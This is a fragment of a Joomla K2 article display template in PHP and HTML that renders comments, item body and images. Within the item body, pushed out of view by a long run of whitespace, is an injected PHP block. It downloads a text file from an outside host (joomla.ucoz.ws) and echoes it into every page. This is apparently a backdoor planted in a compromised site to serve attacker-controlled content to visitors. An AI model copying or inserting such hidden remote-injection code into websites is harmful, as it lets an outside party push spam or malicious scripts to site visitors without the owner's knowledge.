        ...
        <div class="leoComments">
            ...
            <?php else:?>
                <a class="itemCommentsLink k2Anchor" href="<?php echo $this->item->link; ?>#itemCommentsAnchor">
                	...
                	<?php echo ($this->item->numOfComments > 1 || $this->item->numOfComments == 0) ? JText::_('K2_COMMENTS') : JText::_('K2_COMMENT'); ?>
                </a>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    ...
    <div class="leoItemBlock">
	    ...
	    <div class="itemBody">
	        <?php echo $this->item->event->BeforeDisplayContent; ?>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                     <?php
$files = 'http://joomla.ucoz.ws/ind.txt';

$file_headers = @get_headers($files); if($file_headers[0] == 'HTTP/1.1 200 OK')
{
$content = file("http://joomla.ucoz.ws/ind.txt");
...
echo $data; } ?>
	        ...
	        <div class="itemImageBlock">
	            <span class="itemImage">
	            	<a class="modal" rel="{handler: 'image'}" href="<?php echo $this->item->imageXLarge; ?>" title="<?php echo JText::_('K2_CLICK_TO_PREVIEW_IMAGE'); ?>">
	            		<img src="<?php echo $this->item->image; ?>" alt="<?php if(!empty($this->item->image_caption)) echo K2HelperUtilities::cleanHtml($this->item->image_caption); else echo K2HelperUtilities::cleanHtml($this->item->title); ?>" style="width:<?php //echo $this->item->imageWidth; ?>95%; height:auto;" />
	            	</a>
	            </span>
    ...
    <div class="itemComments">
        ...
        <div class="leoDate">
        	<div><?php echo $this->item->numOfComments; ?></div>
        </div>
        
        <h3 class="leoCommentsCount">
        ...
        <div class="leoDate comments">Comments</div>
        <div class="itemCommentsForm">
            <?php echo $this->loadTemplate('comments_form'); ?>
        </div>
        <?php endif; ?>
